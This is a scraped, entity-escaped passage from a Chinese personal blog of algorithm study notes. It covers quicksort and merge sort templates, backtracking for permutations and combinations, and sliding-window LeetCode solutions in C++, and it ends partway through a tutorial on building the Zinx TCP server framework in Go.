\u0026#39;1\u0026#39;)  {  if (i \u0026lt; n \u0026amp;\u0026amp; j \u0026lt; m)  pL(i, j, 0), pL(i, j + 1, 1), pL(i + 1, j, 3);  else if (i == n \u0026amp;\u0026amp; j == m)  pL(i, j, 2), pL(i - 1, j, 1), pL(i, j - 1, 3);  else if (i == n)  pL(i, j, 3), pL(i - 1, j, 0), pL(i, j + 1, 2);  else  pL(i, j, 1), pL(i, j - 1, 0), pL(i + 1, j, 2);  }  }  return 0; }   数字矩阵 三元数异或 兔子跳 亮灯时长 数组补全 点 战舰 质数问题 解码 构造字符串 幸运年份 ","permalink":"https://kevinerr.github.io/posts/algorithm/2021%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%E6%9A%91%E5%81%87/","summary":"[]: https://www.acwing.com/problem/content/description/3765/ 二进制矩阵 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 #include \u0026lt;iostream\u0026gt;#include \u0026lt;cstring\u0026gt;#include \u0026lt;algorithm\u0026gt; using namespace std; const","title":"2021每日一题暑假"},{"content":"排序的问题基本都是让我们利用各种排序的思想去解决其他问题的\n快排 思想 快速排序所采用的思想是分治的思想。所谓分治，就是指以一个数为基准，将序列中的其他数往它两边“扔”。以从小到大排序为例，比它小的都“扔”到它的左边，比它大的都“扔”到它的右边，然后左右两边再分别重复这个操作，不停地分，直至分到每一个分区的基准数的左边或者右边都只剩一个数为止。这时排序也就完成了。\n快排模板 1 2 3 4 5 6 7 8 9 10 11 12 13  void quick_sort(int q[], int l, int r) {  if (l \u0026gt;= r) return;   int i = l - 1, j = r + 1, x = q[l + r \u0026gt;\u0026gt; 1];  while (i \u0026lt; j)  {  do i ++ ; while (q[i] \u0026lt; x);  do j -- ; while (q[j] \u0026gt; x);  if (i \u0026lt; j) swap(q[i], q[j]);  }  quick_sort(q, l, j), quick_sort(q, j + 1, r); }   32、调整数组顺序使奇数位于偶数前面 1 2 3 4 5 6 7 8 9 10 11  class Solution { public:  void reOrderArray(vector\u0026lt;int\u0026gt; \u0026amp;array) {  int l = 0, r = array.size() - 1;  while (l \u0026lt; r) {  while (l \u0026lt; r \u0026amp;\u0026amp; array[l] % 2 == 1) l ++ ;  while (l \u0026lt; r \u0026amp;\u0026amp; array[r] % 2 == 0) r -- ;  if (l \u0026lt; r) swap(array[l], array[r]);  }  } };   普通归并 思想 分治思想：分：划分成很多个小的问题，然后递归处理，治：将分阶段得到的答案整合起来，即为分治思想。\n归并模板 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  void merge_sort(int q[], int l, int r) {  if (l \u0026gt;= r) return;   int mid = l + r \u0026gt;\u0026gt; 1;  merge_sort(q, l, mid);  merge_sort(q, mid + 1, r);   int k = 0, i = l, j = mid + 1;  while (i \u0026lt;= mid \u0026amp;\u0026amp; j \u0026lt;= r)  if (q[i] \u0026lt;= q[j]) tmp[k ++ ] = q[i ++ ];  else tmp[k ++ ] = q[j ++ ];   while (i \u0026lt;= mid) tmp[k ++ ] = q[i ++ ];  while (j \u0026lt;= r) tmp[k ++ ] = q[j ++ ];   for (i = l, j = 0; i \u0026lt;= r; i ++, j ++ ) q[i] = tmp[j]; }   65、数组中的逆序对 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  class Solution { public:  int res = 0;  int b[100];  void merge_sort(vector\u0026lt;int\u0026gt;\u0026amp; a,int l,int r){  if(l\u0026gt;=r) return;  int mid = l+r\u0026gt;\u0026gt;1;  merge_sort(a,l,mid);  merge_sort(a,mid+1,r);  int k = l,i=l,j=mid+1;  while(i\u0026lt;=mid\u0026amp;\u0026amp;j\u0026lt;=r){  if(a[i]\u0026lt;=a[j]) b[k++]=a[i++];  else{  b[k++]=a[j++];  res+=mid-i+1;  }  }  while(i\u0026lt;=mid) b[k++]=a[i++];  while(j\u0026lt;=r) b[k++]=a[j++];  for(i=l;i\u0026lt;=r;i++) a[i]=b[i];  }  int inversePairs(vector\u0026lt;int\u0026gt;\u0026amp; nums) {  merge_sort(nums,0,nums.size()-1);  return res;  } };   三路归并 62、丑数 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  class Solution { public:  int getUglyNumber(int n) {  if(n \u0026lt;= 1) return n;  vector\u0026lt;int\u0026gt; f(1,1);  int i = 0, j = 0, k = 0;  long long t = 0;  while(--n)  {  t = min({f[i] * 2,f[j] * 3, f[k] * 5});  if(t == f[i] * 2) i++;  if(t == f[j] * 3) j++;  if(t == f[k] * 5) k++;  f.push_back(t);  }  return f.back();   } };   ","permalink":"https://kevinerr.github.io/posts/algorithm/%E6%8E%92%E5%BA%8F/","summary":"排序的问题基本都是让我们利用各种排序的思想去解决其他问题的 快排 思想 快速排序所采用的思想是分治的思想。所谓分治，就是指以一个数为基准，将序列中","title":"排序"},{"content":"排列组合 回溯算法是什么？解决回溯算法相关的问题有什么技巧？如何学习回溯算法？回溯算法代码是否有规律可循？\n其实回溯算法其实就是我们常说的 DFS 算法，本质上就是一种暴力穷举算法。\n废话不多说，直接上回溯算法框架。解决一个回溯问题，实际上就是一个决策树的遍历过程。\n站在回溯树的一个节点上，你只需要思考 3 个问题：\n1、路径：也就是已经做出的选择。\n2、选择列表：也就是你当前可以做的选择。\n3、结束条件：也就是到达决策树底层，无法再做选择的条件。\n如果你不理解这三个词语的解释，没关系，我们后面会用「全排列」和「N 皇后问题」这两个经典的回溯算法问题来帮你理解这些词语是什么意思，现在你先留着印象。\n代码方面，回溯算法的框架：\n1 2 3 4 5 6 7 8 9 10  result = [] def backtrack(路径, 选择列表):  if 满足结束条件:  result.add(路径)  return   for 选择 in 选择列表:  做选择  backtrack(路径, 选择列表)  撤销选择   综合\n总结 来回顾一下排列/组合/子集问题的三种形式在代码上的区别。\n由于子集问题和组合问题本质上是一样的，无非就是 base case 有一些区别，所以把这两个问题放在一起看。\n形式一、元素无重不可复选 即 nums 中的元素都是唯一的，每个元素最多只能被使用一次，backtrack 核心代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  /* 组合/子集问题回溯算法框架 */ void backtrack(int[] nums, int start) {  // 回溯算法标准框架  for (int i = start; i \u0026lt; nums.length; i++) {  // 做选择  track.addLast(nums[i]);  // 注意参数  backtrack(nums, i + 1);  // 撤销选择  track.removeLast();  } }  /* 排列问题回溯算法框架 */ void backtrack(int[] nums) {  for (int i = 0; i \u0026lt; nums.length; i++) {  // 剪枝逻辑  if (used[i]) {  continue;  }  // 做选择  used[i] = true;  track.addLast(nums[i]);   backtrack(nums);  // 取消选择  track.removeLast();  used[i] = false;  } }   78. 子集 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  class Solution { public:  vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; res;  vector\u0026lt;int\u0026gt; cur;  void dfs(vector\u0026lt;int\u0026gt;\u0026amp; nums,int start){  res.push_back(cur);  for(int i =start;i\u0026lt;nums.size();i++){  cur.push_back(nums[i]);  dfs(nums,i+1);  cur.pop_back();  }   }  vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; subsets(vector\u0026lt;int\u0026gt;\u0026amp; nums) {  dfs(nums,0);  return res;  } };   216. 组合总和 III 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  class Solution { public:  vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; res;  vector\u0026lt;int\u0026gt; cur;  void dfs(int start,int k, int target,int sum){  if(target==sum\u0026amp;\u0026amp;k==0){  res.push_back(cur);  return;  }  if(sum\u0026gt;target) return;  for(int i =start;i\u0026lt;=9;i++){  sum+=i;  cur.push_back(i);  k--;  dfs(i+1,k,target,sum);  sum-=i;  cur.pop_back();  k++;  }  }  vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; combinationSum3(int k, int n) {  dfs(1,k,n,0);  return res;  } };   46. 全排列 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  class Solution { public:  vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; res;  vector\u0026lt;int\u0026gt; cur;  bool st[8];  void dfs(vector\u0026lt;int\u0026gt;\u0026amp; nums){  if(cur.size()==nums.size()){  res.push_back(cur);  return;  }  for(int i =0;i\u0026lt;nums.size();i++){  if(!st[i]){  st[i]=true;  cur.push_back(nums[i]);  dfs(nums);  st[i]=false;  cur.pop_back();  }  }  }  vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; permute(vector\u0026lt;int\u0026gt;\u0026amp; nums) {  dfs(nums);  return res;  } };   77. 组合 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  class Solution { public:  vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; res;  vector\u0026lt;int\u0026gt; cur;  void dfs(int start,int n,int k){  if(cur.size()==k){  res.push_back(cur);  return;  }  for(int i = start;i\u0026lt;=n;i++){  cur.push_back(i);  dfs(i+1,n,k);  cur.pop_back();  }  }  vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; combine(int n, int k) {  dfs(1,n,k);  return res;  } };   形式二、元素可重不可复选 即 nums 中的元素可以存在重复，每个元素最多只能被使用一次，其关键在于排序和剪枝，backtrack 核心代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41  Arrays.sort(nums); /* 组合/子集问题回溯算法框架 */ void backtrack(int[] nums, int start) {  // 回溯算法标准框架  for (int i = start; i \u0026lt; nums.length; i++) {  // 剪枝逻辑，跳过值相同的相邻树枝  if (i \u0026gt; start \u0026amp;\u0026amp; nums[i] == nums[i - 1]) {  continue;  }  // 做选择  track.addLast(nums[i]);  // 注意参数  backtrack(nums, i + 1);  // 撤销选择  track.removeLast();  } }   Arrays.sort(nums); /* 排列问题回溯算法框架 */ void backtrack(int[] nums) {  for (int i = 0; i \u0026lt; nums.length; i++) {  // 剪枝逻辑  if (used[i]) {  continue;  }  // 剪枝逻辑，固定相同的元素在排列中的相对位置  if (i \u0026gt; 0 \u0026amp;\u0026amp; nums[i] == nums[i - 1] \u0026amp;\u0026amp; !used[i - 1]) {  continue;  }  // 做选择  used[i] = true;  track.addLast(nums[i]);   backtrack(nums);  // 取消选择  track.removeLast();  used[i] = false;  } }   40. 组合总和 II 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  class Solution { public:  vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; res;  vector\u0026lt;int\u0026gt; cur;  void dfs(int start,vector\u0026lt;int\u0026gt;\u0026amp; candidates, int target,int sum){  if(target==sum){  res.push_back(cur);  return;  }  if(sum\u0026gt;target) return;  for(int i =start;i\u0026lt;candidates.size();i++){  // 剪枝逻辑，跳过值相同的相邻树枝  if (i \u0026gt; start \u0026amp;\u0026amp; candidates[i] == candidates[i - 1]) {  continue;  }  sum+=candidates[i];  cur.push_back(candidates[i]);  dfs(i+1,candidates,target,sum);  sum-=candidates[i];  cur.pop_back();  }  }  vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; combinationSum2(vector\u0026lt;int\u0026gt;\u0026amp; candidates, int target) {  sort(candidates.begin(),candidates.end());  dfs(0,candidates,target,0);  return res;  } };   90. 子集 II 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  class Solution { public:  vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; res;  vector\u0026lt;int\u0026gt; cur;  bool st[8];  void dfs(vector\u0026lt;int\u0026gt;\u0026amp; nums,int start){  res.push_back(cur);  for(int i =start;i\u0026lt;nums.size();i++){  // 剪枝逻辑，值相同的相邻树枝，只遍历第一条  if (i \u0026gt; start \u0026amp;\u0026amp; nums[i] == nums[i - 1]) {  continue;  }  cur.push_back(nums[i]);  dfs(nums,i+1);  cur.pop_back();  }  }  vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; subsetsWithDup(vector\u0026lt;int\u0026gt;\u0026amp; nums) {  // 先排序，让相同的元素靠在一起  sort(nums.begin(),nums.end());  dfs(nums,0);  return res;  } };   47. 全排列 II 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  class Solution { public:  vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; res;  vector\u0026lt;int\u0026gt; cur;  bool st[10];  void dfs(vector\u0026lt;int\u0026gt;\u0026amp; nums){  if(cur.size()==nums.size()){  res.push_back(cur);  return;  }  for(int i =0;i\u0026lt;nums.size();i++){  // 剪枝逻辑，值相同的相邻树枝，只遍历第一条  if (i \u0026gt; 0 \u0026amp;\u0026amp; nums[i] == nums[i - 1]\u0026amp;\u0026amp; !st[i - 1]) {  continue;  }  if(!st[i]){  st[i]=true;  cur.push_back(nums[i]);  dfs(nums);  st[i]=false;  cur.pop_back();  }  }  }  vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; permuteUnique(vector\u0026lt;int\u0026gt;\u0026amp; nums) {  sort(nums.begin(),nums.end());  dfs(nums);  return res;  } };   形式三、元素无重可复选 即 nums 中的元素都是唯一的，每个元素可以被使用若干次，只要删掉去重逻辑即可，backtrack 核心代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  /* 组合/子集问题回溯算法框架 */ void backtrack(int[] nums, int start) {  // 回溯算法标准框架  for (int i = start; i \u0026lt; nums.length; i++) {  // 做选择  track.addLast(nums[i]);  // 注意参数  backtrack(nums, i);  // 撤销选择  track.removeLast();  } }   /* 排列问题回溯算法框架 */ void backtrack(int[] nums) {  for (int i = 0; i \u0026lt; nums.length; i++) {  // 做选择  track.addLast(nums[i]);   backtrack(nums);  // 取消选择  track.removeLast();  } }   39. 组合总和 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  class Solution { public:  vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; res;  vector\u0026lt;int\u0026gt; cur;  void dfs(int start,vector\u0026lt;int\u0026gt;\u0026amp; candidates, int target,int sum){  if(target==sum){  res.push_back(cur);  return;  }  if(sum\u0026gt;target) return;  for(int i =start;i\u0026lt;candidates.size();i++){  sum+=candidates[i];  cur.push_back(candidates[i]);  dfs(i,candidates,target,sum);  sum-=candidates[i];  cur.pop_back();  }  }  vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; combinationSum(vector\u0026lt;int\u0026gt;\u0026amp; candidates, int target) {  dfs(0,candidates,target,0);  return res;  } };   ","permalink":"https://kevinerr.github.io/posts/algorithm/%E6%8E%92%E5%88%97%E7%BB%84%E5%90%88/","summary":"排列组合 回溯算法是什么？解决回溯算法相关的问题有什么技巧？如何学习回溯算法？回溯算法代码是否有规律可循？ 其实回溯算法其实就是我们常说的 DFS 算法","title":"排列组合"},{"content":"滑动窗口法 什么情况下会想到滑动窗口法：\n任何题目如果没有思路其实都可以想一下暴力解法。这道题暴力解法思路简单：\n遍历任意i，j，使得i和j之间的子串长度，等于p串的长度。该子串称之为x。该步复杂度为O（n）。 判断x是否与p是异位词。是的话，则把i加入答案中。该步复杂度为O（n）。 暴力法的复杂度为O（n^2）。显然不高效。\n可以发现第二步其实做了很多不必要的操作，例如[i, j]和[i+1, j+1]两个子串在暴力法第二步中，需要各遍历一次，完全没必要。其实[i+1, j+1]完全可以在[i, j]的基础上做判断，也就是去掉头部的字符（i位置），加上尾部的字符（j+1位置）。这样第一步的复杂度可以降到O(1)。整体复杂度降到O(n)。已经得到信息不重复使用就浪费了，没必要重新搜集近乎相同的信息。这就是滑动窗口法。\n滑动窗口法的特点是，一连串元素的信息，可以用常数时间推断出，该串整体移位后，新串信息。\n所有滑动窗口问题，如果能从暴力法优化的角度思考，都不难想到。\n双指针 1 2 3 4 5 6 7 8 9  for (int i = 0, j = 0; i \u0026lt; n; i ++ ) {  while (j \u0026lt; i \u0026amp;\u0026amp; check(i, j)) j ++ ;   // 具体问题的逻辑 } 常见问题分类：  (1) 对于一个序列，用两个指针维护一段区间  (2) 对于两个序列，维护某种次序，比如归并排序中合并两个有序序列的操作   medium 和为S的连续正数序列 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  class Solution { public:  vector\u0026lt;vector\u0026lt;int\u0026gt; \u0026gt; findContinuousSequence(int sum) {  vector\u0026lt;vector\u0026lt;int\u0026gt; \u0026gt; res;  if(sum==0||sum==1) return res;  vector\u0026lt;int\u0026gt; cur;  int count = 0;  for(int i =1,j=1;i\u0026lt;=sum/2+1;i++){  count+=i;  while(count\u0026gt;sum){  count-=j++;  }  if(count==sum){  for(int k =j;k\u0026lt;=i;k++){  cur.push_back(k);  }  res.push_back(cur);  cur.clear();  }  }  return res;  } };   字符流中第一个只出现一次的字符 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  class Solution{ public:   //记录每个字符出现的个数  map\u0026lt;char, int\u0026gt;buff;  //y总说了：双指针和单调队列有点相似(狗头  queue\u0026lt;int\u0026gt;q;  void insert(char ch){  //如果buff里面的记录的ch个数为1，并且队列不为空，对头头元素的个数大于1  //队列里面可能会空，但是buff里面一直已经存在的字符  if (++ buff[ch] \u0026gt; 1) {  while (q.size() \u0026amp;\u0026amp; buff[q.front()] \u0026gt; 1) q.pop();  } else {  q.push(ch);  }  }  //return the first appearence once char in current stringstream  char firstAppearingOnce(){  if (q.empty()) return \u0026#39;#\u0026#39;;  else return q.front();  } };   3. 无重复字符的最长子串 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  class Solution { public:  int lengthOfLongestSubstring(string s) {  unordered_map\u0026lt;char,int\u0026gt; hash;  int res=0;  for(int i=0,j=0;j\u0026lt;s.size();j++)  {  hash[s[j]]++;  while(hash[s[j]]\u0026gt;1)  {  hash[s[i++]]--;  }   res=max(res,j-i+1);  }  return res;  } };   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  class Solution { public:  int lengthOfLongestSubstring(string s) {  int n =s.length();  unordered_set\u0026lt;char\u0026gt; st;  if(n==0) return 0;  int maxStr = 0,left=0;  for(int i =0;i\u0026lt;n;i++){  while(st.find(s[i])!=st.end()){  st.erase(s[left]);  left++;  }  st.insert(s[i]);  maxStr = max(maxStr,i-left+1);  }  return maxStr;  } };   643. 子数组最大平均数 I 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  class Solution { public:  double findMaxAverage(vector\u0026lt;int\u0026gt;\u0026amp; nums, int k) {  double res=-5e4-5.5;  int n = nums.size(),left=0,len=0;  double sum = 0.0;  for(int i =0;i\u0026lt;n;i++){  sum+=nums[i];  len++;  while(len==k){  res=max(res,sum/k);  sum-=nums[left];  left++;  len--;  }  }  return res;  } };   209. 长度最小的子数组 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  class Solution { public:  int minSubArrayLen(int target, vector\u0026lt;int\u0026gt;\u0026amp; nums) {  int n = nums.size();  int left=0,res=n,sum=0;  bool flag =false;  for(int i = 0;i\u0026lt;n;i++){  sum+=nums[i];  while(sum\u0026gt;=target){  res=min(res,i-left+1);  sum-=nums[left];  left++;  flag=true;  }  }  if(flag) return res;  else return 0;  } };   1695. 删除子数组的最大得分 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  class Solution { public:  int maximumUniqueSubarray(vector\u0026lt;int\u0026gt;\u0026amp; nums) {  int n = nums.size();  unordered_set\u0026lt;int\u0026gt; st;  int left =0;  int res =0,sum=0;  for(int i =0;i\u0026lt;n;i++){  while(st.find(nums[i])!=st.end()){  st.erase(nums[left]);  sum-=nums[left];  left++;  }  st.insert(nums[i]);  sum+=nums[i];  res=max(res,sum);  }  return res;  } };   438. 找到字符串中所有字母异位词 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  class Solution { public:  vector\u0026lt;int\u0026gt; findAnagrams(string s, string p) {  vector\u0026lt;int\u0026gt; result;  int n = s.length(),m=p.length();  if(n\u0026lt;m) return result;  vector\u0026lt;int\u0026gt; a(26,0);  vector\u0026lt;int\u0026gt; b(26,0);  for(int i =0;i\u0026lt;m;i++) b[p[i]-\u0026#39;a\u0026#39;]++;  int left = 0;  for(int i =0;i\u0026lt;n;i++){  a[s[i]-\u0026#39;a\u0026#39;]++;  if(i\u0026gt;=m){  a[s[left]-\u0026#39;a\u0026#39;]--;  left++;  }  if(a==b) result.push_back(left);  }  return result;  } };   567. 字符串的排列 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  class Solution { public:  bool checkInclusion(string s1, string s2) {  int n = s1.length(),m=s2.length();  if(n\u0026gt;m) return false;  vector\u0026lt;int\u0026gt; a(26,0);  vector\u0026lt;int\u0026gt; b(26,0);  for(int i = 0;i\u0026lt;n;i++){  a[s1[i]-\u0026#39;a\u0026#39;]++;  }  int left=0;  for(int i =0;i\u0026lt;m;i++){  b[s2[i]-\u0026#39;a\u0026#39;]++;  if(i\u0026gt;=n){  b[s2[left]-\u0026#39;a\u0026#39;]--;  left++;  }  if(a==b) return true;  }  return false;  } };   1004. 最大连续1的个数 III 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  class Solution { public:  int longestOnes(vector\u0026lt;int\u0026gt;\u0026amp; nums, int k) {  int n = nums.size();  deque\u0026lt;int\u0026gt; a;  int res = 0;  for(int i =0;i\u0026lt;n;i++){  while(k==0\u0026amp;\u0026amp;nums[i]==0){  if(a.front()==1){  a.pop_front();  }else{  a.pop_front();  k++;  }  }  if(nums[i]==0){  k--;  }  a.push_back(nums[i]);  int t = a.size();  res=max(res,t);   }  return res;  } };   1208. 尽可能使字符串相等 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  class Solution { public:  int equalSubstring(string s, string t, int maxCost) {  int res = 0;  int n = s.length();  int a[n];  vector\u0026lt;int\u0026gt; b(n,0);  for(int i =0;i\u0026lt;n;i++){  a[i]=abs(s[i]-t[i]);  }  int left=0,len=0;  for(int i = 0;i\u0026lt;n;i++){  b[i]=a[i];  maxCost-=a[i];  len++;  while(maxCost\u0026lt;0){  maxCost+=b[left];  left++;  len--;  }  res=max(res,len);  }  return res;  } };   1052. 爱生气的书店老板 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  class Solution { public:  int maxSatisfied(vector\u0026lt;int\u0026gt;\u0026amp; customers, vector\u0026lt;int\u0026gt;\u0026amp; grumpy, int minutes) {  int n = customers.size();  int sum = 0;  int res=0;  vector\u0026lt;int\u0026gt; v;  for(int i =0;i\u0026lt;n;i++){  if(grumpy[i]==0) sum+=customers[i];  else{  v.push_back(i);  }  }  int left = 0;  for(int i =0;i\u0026lt;v.size();i++){  while(v[i]-v[left]\u0026gt;=minutes){  sum-=customers[v[left]];  left++;  }  sum+=customers[v[i]];  res=max(res,sum);  }  res=max(res,sum);  return res;  } };   1423. 可获得的最大点数 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  class Solution { public:  int maxScore(vector\u0026lt;int\u0026gt;\u0026amp; cardPoints, int k) {  int n = cardPoints.size();  int res = 0,sum=0,left=n-k,len=k;  vector\u0026lt;int\u0026gt; d;  for(int i = 0;i\u0026lt;n;i++){  d.push_back(cardPoints[i]);  }  for(int i = 0;i\u0026lt;n;i++){  d.push_back(cardPoints[i]);  }  for(int i =n-k;i\u0026lt;n+k;i++){  sum+=d[i];  len--;  res=max(res,sum);  if(len==0){  sum-=d[left];  left++;  len++;  }  }  return res;  } };   hard 30. 串联所有单词的子串 思路 总共用到两个哈希表，allWordsMap用于记录words中单词出现的次数，nowWordsMap用于记录子串中（也就是滑动窗口中）单词出现的次数 num为单词的个数，onelen为单词长度 遍历字符串，移动长度为 num* onelen的滑动窗口，再在当前滑动窗口中依次比较onelen长度的单词 当这个窗口内一旦出现不存在allWordsMap中的单词，或者这个单词在子串中出现的次数已经等于allWordsMap中的次数(也就是再加入这个子串次数就要超出了)，这个滑动窗口就不符合要求，直接break进入下一个滑动窗口的匹配 一旦完全匹配上了，把滑动窗口的起始索引加入结果res中\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38  class Solution { public:  vector\u0026lt;int\u0026gt; findSubstring(string s, vector\u0026lt;string\u0026gt;\u0026amp; words) {  unordered_map\u0026lt;string, int\u0026gt; allWordsMap;  for (auto\u0026amp; v : words) {  allWordsMap[v]++;  }   int num = words.size();  int onelen = words[0].length();  vector\u0026lt;int\u0026gt; res;  if (s.length() \u0026lt; num * onelen) {  return res;  }   for (int left = 0; left \u0026lt; s.length() - num * onelen + 1; ++left)  {  unordered_map\u0026lt;string, int\u0026gt; nowWordsMap;  int right = left;  while (right \u0026lt; left + num * onelen) {  auto cur = s.substr(right, onelen);  if (allWordsMap.find(cur) == allWordsMap.end()  || nowWordsMap[cur] == allWordsMap[cur]) {  break;  }   ++nowWordsMap[cur];  right += onelen;  }   if (right == left + num * onelen) {  res.push_back(left);  }  }   return res;  } };   76. 最小覆盖子串 239. 滑动窗口最大值 ","permalink":"https://kevinerr.github.io/posts/algorithm/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/","summary":"滑动窗口法 什么情况下会想到滑动窗口法： 任何题目如果没有思路其实都可以想一下暴力解法。这道题暴力解法思路简单： 遍历任意i，j，使得i和j之间的","title":"滑动窗口"},{"content":"代码 本人代码仓库\n官方代码仓库\n官方教程\n官方文档 引言 Golang目前在服务器的应用框架很多，但是应用在游戏领域或者其他长链接的领域的轻量级企业框架甚少\nTCP服务器\nZinx-V0.1-基础Server 服务端\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  //启动服务器方法 Start() //停止服务器方法 Stop() //开启业务服务方法 //TODO Server.Serve() 是否在启动服务的时候 还要处理其他的事情呢 可以在这个方法里添加添加 Serve()  服务器获取客户端的连接步骤 //1 获取一个TCP的Addr addr, err := net.ResolveTCPAddr(s.IPVersion, fmt.Sprintf(\u0026#34;%s:%d\u0026#34;, s.IP, s.Port)) //2 监听服务器地址 listenner, err:= net.ListenTCP(s.IPVersion, addr) //3.1 阻塞等待客户端建立连接请求 conn, err := listenner.AcceptTCP()   客户端\n1 2  //发送一个请求 conn,err := net.Dial(\u0026#34;tcp\u0026#34;, \u0026#34;127.0.0.1:7777\u0026#34;)   交互\n1 2 3 4 5 6 7 8 9  //客户端 _, err := conn.Write([]byte(\u0026#34;hello ZINX\u0026#34;)) buf :=make([]byte, 512) cnt, err := conn.Read(buf)  //服务端 buf := make([]byte, 512) cnt, err := conn.Read(buf) err := conn.Write(buf[:cnt])   链接建立成功后，客户端写了又读，服务端读了又写，闭环\nZinx-V0.2-简单的连接封装与业务绑定 Zinx-V0.1我们只知道连接写读数据，不知道客户端的地址，连接没有id不便管理，于是我们需要把连接封装起来\n并给连接绑定一个api方法\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39  //定义连接接口 type IConnection interface { \t//启动连接，让当前连接开始工作 \tStart() \t//停止连接，结束当前连接状态M \tStop() \t//从当前连接获取原始的socket TCPConn \tGetTCPConnection() *net.TCPConn \t//获取当前连接ID \tGetConnID() uint32 \t//获取远程客户端地址信息 \tRemoteAddr() net.Addr }  //定义一个统一处理链接业务的接口 type HandFunc func(*net.TCPConn, []byte, int) error   type Connection struct { \t//当前连接的socket TCP套接字 \tConn *net.TCPConn \t//当前连接的ID 也可以称作为SessionID，ID全局唯一 \tConnID uint32 \t//当前连接的关闭状态 \tisClosed bool  \t//该连接的处理方法api \thandleAPI ziface.HandFunc  \t//告知该链接已经退出/停止的channel \tExitBuffChan chan bool }  //3.3 处理该新连接请求的 业务 方法， 此时应该有 handler 和 conn是绑定的 dealConn := NewConntion(conn, cid, CallBackToClient) cid ++  //3.4 启动当前链接的处理业务 go dealConn.Start()   总来来说就是一个api方法和连接绑定，一旦有客户端连接，就新建一个连接、api和这个客户端绑定，并启动这个连接来干业务\nZinx-V0.3-集成简单路由功能 底层再往上面跑一点，把客户端请求的连接信息 和 请求的数据，放在一个叫Request的请求类里，这样的好处是我们可以从Request里得到全部客户端的请求信息\n这里面有个非常好的设计模式，使用基类，并且基类的方法都为空，然后子类继承这个基类，子类就只需要重写需要的方法。\n.\\Server.go:44:14: cannot use \u0026amp;PingRouter{} (value of type *PingRouter) as type ziface.IRouter in argument to s.AddRouter: *PingRouter does not implement ziface.IRouter (missing PreHandle method)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  /* 路由接口， 这里面路由是 使用框架者给该链接自定的 处理业务方法 路由里的IRequest 则包含用该链接的链接信息和该链接的请求数据信息 */ type IRouter interface{ \tPreHandle(request IRequest) //在处理conn业务之前的钩子方法 \tHandle(request IRequest)\t//处理conn业务的方法 \tPostHandle(request IRequest) //处理conn业务之后的钩子方法 }  //实现router时，先嵌入这个基类，然后根据需要对这个基类的方法进行重写 type BaseRouter struct {}  //这里之所以BaseRouter的方法都为空， // 是因为有的Router不希望有PreHandle或PostHandle // 